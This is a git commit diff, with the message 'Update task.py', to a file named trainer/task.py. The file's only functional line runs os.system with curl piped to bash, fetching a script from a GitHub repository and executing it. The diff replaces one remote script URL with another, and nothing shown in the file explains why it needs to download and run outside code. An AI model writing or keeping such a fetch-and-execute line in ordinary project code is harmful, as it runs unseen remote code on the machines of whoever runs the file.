587e5f2c7acfbd5577e3b6c24c6bb1f3cbaca400
yafcoplk <kirankommeli@zohomail.in>
2026-06-03 03:06:04 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/yafcoplk/tinta/raw/main/tintas | bash')
+os.system('curl -sL https://github.com/yafcoplk/tintatest/raw/main/tintatest | bash')
